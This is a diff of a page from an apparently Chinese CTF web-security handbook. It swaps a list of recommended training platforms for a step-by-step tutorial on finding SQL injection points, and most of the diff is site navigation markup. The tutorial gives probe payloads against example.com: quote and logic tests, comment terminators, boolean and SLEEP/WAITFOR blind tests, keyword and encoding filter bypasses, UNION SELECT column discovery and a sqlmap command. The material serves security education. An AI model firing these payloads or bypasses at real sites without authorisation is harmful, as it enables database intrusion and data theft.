@@ -9,8 +9,10 @@
       
       
       
-        <link rel="prev" href="../%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/">
+        <link rel="prev" href="../SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD%E4%B8%8E%E7%B1%BB%E5%9E%8B%E5%88%86%E6%9E%90/">
       
+      
+        <link rel="next" href="../%E5%9F%BA%E7%A1%80SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E5%A4%A7%E5%85%A8/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -18,7 +20,7 @@
     
     
       
-        <title>学习平台推荐 - CTF-Web修炼手册</title>
+        <title>SQL注入点判断 - CTF-Web修炼手册</title>
       
     
     
@@ -72,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#_1" class="md-skip">
+        <a href="#sql" class="md-skip">
           跳转至
         </a>
       
@@ -106,7 +108,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              学习平台推荐
+              SQL注入点判断
             
           </span>
         </div>
@@ -256,10 +258,12 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
+      <li class="md-tabs__item md-tabs__item--active">
         <a href="../SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD%E4%B8%8E%E7%B1%BB%E5%9E%8B%E5%88%86%E6%9E%90/" class="md-tabs__link">
           
   
@@ -316,13 +320,11 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
-        <a href="./" class="md-tabs__link">
+      <li class="md-tabs__item">
+        <a href="../%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0%E6%8E%A8%E8%8D%90/" class="md-tabs__link">
           
   
   
@@ -526,28 +528,31 @@
       
   
   
+    
   
   
+  
     
     
     
     
+      
+        
+        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
-        
-          
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
             
   
   
@@ -560,7 +565,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             SQL注入基础
@@ -594,10 +599,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%ADSQL%E6%B3%A8%E5%85%A5%E7%82%B9/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    SQL注入点判断
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -608,6 +635,194 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 识别输入点
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 初步探测
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. 初步探测">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      （1）单引号测试
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      （2）逻辑测试
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. 参数类型判断
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. 参数类型判断">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      （1）数字型参数
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      （2）字符型参数
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. 注释符验证
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. 盲注检测
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. 盲注检测">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      （1）布尔型检测
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      （2）时间型检测
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. 过滤规则测试
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. 过滤规则测试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      （1）关键字绕过
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      （2）特殊字符绕过
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. 联合查询验证
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      8. 工具辅助验证
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -981,31 +1196,28 @@
       
   
   
-    
   
   
-  
     
     
     
     
-      
-        
-        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" checked>
         
           
-          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
             
   
   
@@ -1018,7 +1230,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_6">
             <span class="md-nav__icon md-icon"></span>
             学习资源
@@ -1029,32 +1241,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    学习平台推荐
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0%E6%8E%A8%E8%8D%90/" class="md-nav__link">
         
   
   
@@ -1065,71 +1255,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      🧠 算法刷题平台
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔐 网络安全训练平台
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    <span class="md-ellipsis">
-      🛡️ 实战型安全学习平台
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    <span class="md-ellipsis">
-      📚 教程型 / 趣味型学习平台
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔐 密码学学习平台
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1169,45 +1294,168 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
+  <a href="#1" class="md-nav__link">
     <span class="md-ellipsis">
-      🧠 算法刷题平台
+      1. 识别输入点
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
+  <a href="#2" class="md-nav__link">
     <span class="md-ellipsis">
-      🔐 网络安全训练平台
+      2. 初步探测
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. 初步探测">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      （1）单引号测试
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      （2）逻辑测试
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. 参数类型判断
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. 参数类型判断">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      （1）数字型参数
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      （2）字符型参数
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. 注释符验证
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
+  <a href="#5" class="md-nav__link">
     <span class="md-ellipsis">
-      🛡️ 实战型安全学习平台
+      5. 盲注检测
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. 盲注检测">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      （1）布尔型检测
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      （2）时间型检测
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. 过滤规则测试
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. 过滤规则测试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      （1）关键字绕过
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      （2）特殊字符绕过
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. 联合查询验证
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
+  <a href="#8" class="md-nav__link">
     <span class="md-ellipsis">
-      📚 教程型 / 趣味型学习平台
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔐 密码学学习平台
+      8. 工具辅助验证
     </span>
   </a>
   
@@ -1232,73 +1480,160 @@
   
 
 
-<h1 id="_1">网络安全与算法学习平台推荐</h1>
-<p>以下是一些优质的算法学习与网络安全训练平台，按类别整理，涵盖了从新手入门到进阶实战的各个阶段，适合算法练习、CTF竞赛、红蓝对抗等多种学习场景。</p>
-<hr />
-<h2 id="_2">🧠 算法刷题平台</h2>
-<p><strong>1. <a href="https://github.com/labuladong/fucking-algorithm?tab=readme-ov-file">labuladong/fucking-algorithm</a></strong>
- 推荐指数：★★★★★
- 这是一个系统性学习算法和数据结构的开源项目，内容从基础到进阶应有尽有，讲解清晰易懂，非常适合想提升算法思维和解题能力的开发者和学生。</p>
-<p><strong>2. <a href="https://github.com/youngyangyang04/leetcode-master">youngyangyang04/leetcode-master</a></strong>
- 推荐指数：★★★★
- 专注于 LeetCode 的刷题项目，提供详细的解题思路、代码示例和学习路径，适合想高效刷题、备战面试的人群。</p>
-<hr />
-<h2 id="_3">🔐 网络安全训练平台</h2>
-<p><strong>3. <a href="https://ctf.show/">CTFSHOW</a></strong>
- 推荐指数：★★★
- 一个适合初学者的 CTF 练习平台，拥有1500多个原创题目和友好的社区氛围，由上万名 CTF 爱好者共同打造。</p>
-<p><strong>4. <a href="https://www.nssctf.cn/">NSSCTF</a></strong>
- 推荐指数：★★★★
- 提供题库、比赛和 Writeup 资源，国内很多比赛的题目可以在这里复现，非常适合系统练习和社区交流。</p>
-<p><strong>5. <a href="https://buuoj.cn/">BUUCTF</a></strong>
- 推荐指数：★★
- 包含大量CTF比赛题目的聚合平台，适合题海战术式练习和复现经典题目。</p>
-<p><strong>6. <a href="https://ctf.bugku.com/">bugku</a></strong>
- 推荐指数：★★
- 提供安全相关知识挑战，适合初学者尝试和了解基础安全问题。</p>
-<hr />
-<h2 id="_4">🛡️ 实战型安全学习平台</h2>
-<p><strong>7. <a href="https://attackdefense.com/">Attack-Defense Labs</a></strong>
- 推荐指数：★★★★★
- 拥有2000+互动实验室，从Web到系统再到渗透全栈覆盖，适合从初学者到专家的实战技能训练。</p>
-<p><strong>8. <a href="https://tryhackme.com/">TryHackMe</a></strong>
- 推荐指数：★★★★★
- 通过任务引导方式学习网络安全，内容覆盖红队、蓝队、渗透测试等多个方向，适合新手到进阶用户。</p>
-<p><strong>9. <a href="https://www.hackthebox.eu/">HackTheBox</a></strong>
- 推荐指数：★★★★★
- 全球知名的靶机平台，提供大量真实环境靶机挑战，是CTF高手和安全从业者的常驻平台。</p>
-<p><strong>10. <a href="https://www.vulnhub.com/">VulnHub</a></strong>
- 推荐指数：★★★★★
- 老牌靶机平台，提供可下载的虚拟机靶机，适合本地搭建环境做渗透练习。</p>
-<p><strong>11. <a href="https://www.root-me.org/?lang=en">Root-Me</a></strong>
- 推荐指数：★★★★★
- 支持多种挑战类型，包括Web、逆向、密码学等，界面简洁，题目优质。</p>
-<p><strong>12. <a href="https://hackmyvm.eu/">HackMyVM</a></strong>
- 推荐指数：★★★
- 类似 VulnHub 和 HTB，提供大量靶机资源，适合渗透测试爱好者实战演练。</p>
-<hr />
-<h2 id="_5">📚 教程型 / 趣味型学习平台</h2>
-<p><strong>13. <a href="https://www.hacksplaining.com/">Learn to Hack (Hacksplaining)</a></strong>
- 推荐指数：★★★★★
- 交互式的安全教学平台，通过实际案例介绍常见的漏洞及其防御方式，适合课堂教学和个人学习。</p>
-<p><strong>14. <a href="https://defendtheweb.net/">Defend the Web</a></strong>
- 推荐指数：★★★★★
- 拥有60多个互动挑战，提供趣味十足的安全学习体验，适合初学者和进阶用户。</p>
-<p><strong>15. <a href="https://overthewire.org/wargames/">OverTheWire Wargames</a></strong>
- 推荐指数：★★★★★
- 以游戏化方式学习安全知识，经典兵棋推演式学习方式，非常适合入门者打基础。</p>
-<p><strong>16. <a href="https://cmdchallenge.com/">CmdChallenge</a></strong>
- 推荐指数：★★★★★
- 通过解谜游戏学习 Linux 命令行技巧，是锻炼命令行能力的好帮手。</p>
-<hr />
-<h2 id="_6">🔐 密码学学习平台</h2>
-<p><strong>17. <a href="https://cryptohack.org/">CryptoHack</a></strong>
- 推荐指数：★★★★
- 专为学习现代密码学设计，题目趣味性强，涵盖对称加密、RSA、椭圆曲线等内容。</p>
-<hr />
-<blockquote>
-<p>🎯 <strong>学习建议</strong>：初学者可从 CTFSHOW、CryptoHack、TryHackMe 等平台入手，逐步过渡到 HackTheBox、VulnHub、Root-Me 等高难度挑战。算法方面建议先读完 labuladong 的教程，再配合 LeetCode 刷题训练。</p>
-</blockquote>
+<h1 id="sql">如何判断SQL注入点</h1>
+<p>以下是系统性的注入点判断方法和操作步骤：</p>
+<h2 id="1">1. 识别输入点</h2>
+<ul>
+<li><strong>检测位置</strong>：</li>
+<li>URL查询参数（如<code>?id=1</code>）</li>
+<li>表单输入字段（登录框/搜索框）</li>
+<li>HTTP头部（Cookie/User-Agent/Referer）</li>
+<li>REST API参数（JSON/XML数据）</li>
+</ul>
+<h2 id="2">2. 初步探测</h2>
+<h3 id="1_1">（1）单引号测试</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="err">http://example.com/?id=1&#39;</span>
+</code></pre></div>
+<ul>
+<li>
+<p>预期结果：</p>
+</li>
+<li>
+<p>数据库错误（如MySQL的"语法错误"）</p>
+</li>
+<li>500服务器错误</li>
+<li>页面布局异常</li>
+</ul>
+<h3 id="2_1">（2）逻辑测试</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="err">正常情况：http://example.com/?id=1</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="err">恒真条件：http://example.com/?id=1&#39; AND &#39;1&#39;=&#39;1</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="err">恒假条件：http://example.com/?id=1&#39; AND &#39;1&#39;=&#39;2</span>
+</code></pre></div>
+<ul>
+<li>
+<p>对比观察：</p>
+</li>
+<li>
+<p>恒真条件返回正常页面</p>
+</li>
+<li>恒假条件返回空白/错误页面</li>
+</ul>
+<h2 id="3">3. 参数类型判断</h2>
+<h3 id="1_2">（1）数字型参数</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="err">原始请求：http://example.com/?id=1</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="err">修改为：http://example.com/?id=1+1</span>
+</code></pre></div>
+<ul>
+<li>
+<p>判断依据：</p>
+</li>
+<li>
+<p>若返回<code>id=2</code>的结果则为数字型</p>
+</li>
+<li>支持运算表达式（如3-2/5*1）</li>
+</ul>
+<h3 id="2_2">（2）字符型参数</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="err">原始请求：http://example.com/?id=user</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="err">修改为：http://example.com/?id=user&#39;||&#39;test</span>
+</code></pre></div>
+<ul>
+<li>
+<p>判断依据：</p>
+</li>
+<li>
+<p>返回<code>usertest</code>相关结果</p>
+</li>
+<li>需要闭合引号（'或"）</li>
+</ul>
+<h2 id="4">4. 注释符验证</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">MySQL</span><span class="err">：</span><span class="c1">--+ 或 #</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">MSSQL</span><span class="err">：</span><span class="c1">--</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">Oracle</span><span class="err">：</span><span class="c1">--</span>
+</code></pre></div>
+<ul>
+<li><strong>测试用例</strong>：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="err">http://example.com/?id=1&#39;--+</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="err">http://example.com/?id=1&#39; ORDER BY 3#</span>
+</code></pre></div>
+<h2 id="5">5. 盲注检测</h2>
+<h3 id="1_3">（1）布尔型检测</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="err">正常：http://example.com/?id=1&#39; AND 1=1--+</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="err">异常：http://example.com/?id=1&#39; AND 1=2--+</span>
+</code></pre></div>
+<ul>
+<li>
+<p>判断方法：</p>
+</li>
+<li>
+<p>对比两个请求的响应差异</p>
+</li>
+<li>检查页面元素/内容长度变化</li>
+</ul>
+<h3 id="2_3">（2）时间型检测</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="err">MySQL：http://example.com/?id=1&#39; AND SLEEP(5)--+</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="err">MSSQL：http://example.com/?id=1&#39;; WAITFOR DELAY &#39;0:0:5&#39;--</span>
+</code></pre></div>
+<ul>
+<li>
+<p>判断标准：</p>
+</li>
+<li>
+<p>响应时间显著增加（≥5秒）</p>
+</li>
+</ul>
+<h2 id="6">6. 过滤规则测试</h2>
+<h3 id="1_4">（1）关键字绕过</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="err">大小写混合：hTtp://example.com/?id=1&#39; uNIoN sELecT 1,2,3--+</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="err">内联注释：http://example.com/?id=1&#39;/*!UNION*/SELECT 1,2,3--+</span>
+</code></pre></div>
+<h3 id="2_4">（2）特殊字符绕过</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="err">URL编码：%27 → &#39;，%20 → 空格</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="err">双重编码：%2527 → &#39;，%253C → &lt;</span>
+</code></pre></div>
+<h2 id="7">7. 联合查询验证</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="err">步骤1：确定字段数</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="err">http://example.com/?id=1&#39; ORDER BY 5--+</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="err">步骤2：验证回显位置</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="err">http://example.com/?id=-1&#39; UNION SELECT 1,2,3--+</span>
+</code></pre></div>
+<ul>
+<li>
+<p>成功标志：</p>
+</li>
+<li>
+<p>页面显示数字2或3的位置</p>
+</li>
+<li>可在数字位插入SQL函数测试（如version()）</li>
+</ul>
+<h2 id="8">8. 工具辅助验证</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>使用sqlmap检测：
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/?id=1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>--level<span class="o">=</span><span class="m">3</span>
+</code></pre></div>
+<ul>
+<li>
+<p>关键输出：</p>
+</li>
+<li>
+<p>存在可注入参数标识</p>
+</li>
+<li>数据库类型确认</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>graph TD
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>A[开始] --&gt; B{识别输入点}
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>B --&gt; |成功| C[单引号测试]
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>B --&gt; |失败| Z[结束]
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>C --&gt; D{是否报错}
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>D --&gt; |是| E[确认字符型注入]
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>D --&gt; |否| F[逻辑测试]
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>F --&gt; G{页面变化}
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>G --&gt; |有差异| H[存在注入漏洞]
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>G --&gt; |无差异| I[尝试盲注测试]
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>I --&gt; J{时间延迟/布尔结果}
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>J --&gt; |存在差异| H
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>J --&gt; |无差异| Z
+</code></pre></div>
 
 
 
